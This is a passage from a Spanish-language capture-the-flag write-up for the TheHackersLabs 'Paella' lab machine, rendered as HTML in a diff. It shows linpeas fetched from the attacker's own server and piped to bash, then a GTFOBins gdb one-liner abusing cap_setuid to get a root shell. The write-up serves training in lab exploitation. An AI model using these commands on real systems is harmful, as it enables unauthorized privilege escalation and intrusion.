+<li><a href="https://github.com/peass-ng/PEASS-ng/tree/master" target="_blank">Repositorio de peass-ng: PEASS-ng</a></li>
+</ul>
+<p>Bien, podemos descargarlo en la máquina víctima, pero en mi caso, lo voy a ejecutar de manera remota.</p>
+<p>Primero, levanta un servidor con <strong>Python3</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>Desde la máquina víctima, utilizamos <strong>wget</strong> para ejecutar el <strong>linpeas.sh</strong> de manera remota:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>paella@TheHackersLabs-Paella:~$ wget -qO- http://Tu_IP/linpeas.sh | bash
+</span></span></code></pre></div><p>Revisando el resultado, nos muestra una vía potencial para escalar privilegios:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>╔══════════╣ Capabilities
+</span></span><span style="display:flex;"><span>╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities
+</span></span><span style="display:flex;"><span>══╣ Current shell capabilities
+</span></span><span style="display:flex;"><span>CapInh:  0x0000000000000000<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Files with capabilities <span style="color:#f92672">(</span>limited to 50<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>/usr/bin/gdb <span style="color:#f92672">=</span> cap_setuid+ep
+</span></span></code></pre></div><p>Parece que el <strong>binario gdb</strong> tiene capabilities que podemos aprovechar para escalar privilegios.</p>
+<ul>
+<li><strong>cap_setuid</strong>: Esta capability permite al proceso cambiar su propio <strong>UID</strong> (usuario efectivo), como si llamara a la <strong>syscall setuid()</strong> sin restricciones.</li>
+<li><strong>Effective (e)</strong>: La capability está activa en tiempo de ejecución.</li>
+<li><strong>Permitted (p)</strong>: La capability está permitida.</li>
+</ul>
+<p>Podemos investigar en la <strong>guía de GTFOBins</strong>, si es que existe una forma en la que podamos abusar de este binario:</p>
+<ul>
+<li><a href="https://gtfobins.github.io/gtfobins/gdb/" target="_blank">GTFOBins: gdb</a></li>
+</ul>
+<p>Ahí está:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-paella/Captura3.png">
+</p>
+<p>Los comandos indican que debemos asignarle las <strong>capabilities UID</strong> al binario <strong>gdb</strong>, pero esto ya está hecho.</p>
+<p>Así que solamente tenemos que usar el último comando, pero necesitamos ejecutarlo desde su ubicación.</p>
+<p>Se ubica en el directorio <code>/bin</code>, pero en caso de que no esté ahí (que sería raro), usemos el comando <strong>which</strong> para saber si existe y dónde se encuentra:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>paella@TheHackersLabs-Paella:~$ which gdb
+</span></span><span style="display:flex;"><span>/bin/gdb
+</span></span></code></pre></div><p>Vamos a movernos al directorio <code>/bin</code> y ejecutamos el último comando que nos indica la <strong>guía de GTFOBins</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>paella@TheHackersLabs-Paella:~$ cd /bin
+</span></span><span style="display:flex;"><span>paella@TheHackersLabs-Paella:/bin$ ./gdb -nx -ex <span style="color:#e6db74">&#39;python import os; os.setuid(0)&#39;</span> -ex <span style="color:#e6db74">&#39;!bash&#39;</span> -ex quit
+</span></span><span style="display:flex;"><span>GNU gdb <span style="color:#f92672">(</span>Debian 8.2.1-2+b3<span style="color:#f92672">)</span> 8.2.1
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>root@TheHackersLabs-Paella:/bin# 
+</span></span><span style="display:flex;"><span>root@TheHackersLabs-Paella:/bin# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Listo, ya somos <strong>Root</strong>.</p>
+<p>Ya solo busquemos la última flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@TheHackersLabs-Paella:/bin# cd /root
+</span></span><span style="display:flex;"><span>root@TheHackersLabs-Paella:/root# ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>root@TheHackersLabs-Paella:/root# cat root.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Y con esto, terminamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://es.wikipedia.org/wiki/Webmin" target="_blank" rel="noopener noreferrer">https://es.wikipedia.org/wiki/Webmin</a></li><li><a href="https://www.exploit-db.com/exploits/47293" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/47293</a></li><li><a href="https://www.exploit-db.com/exploits/47230" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/47230</a></li><li><a href="https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html" target="_blank" rel="noopener noreferrer">https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html</a></li><li><a href="https://github.com/ruthvikvegunta/CVE-2019-15107" target="_blank" rel="noopener noreferrer">https://github.com/ruthvikvegunta/CVE-2019-15107</a></li><li><a href="https://github.com/peass-ng/PEASS-ng/tree/master" target="_blank" rel="noopener noreferrer">https://github.com/peass-ng/PEASS-ng/tree/master</a></li><li><a href="https://gtfobins.github.io/gtfobins/gdb/" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io/gtfobins/gdb/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-blackGold/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Black Gold - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-caldoAvecrem/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Caldo de Avecrem - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
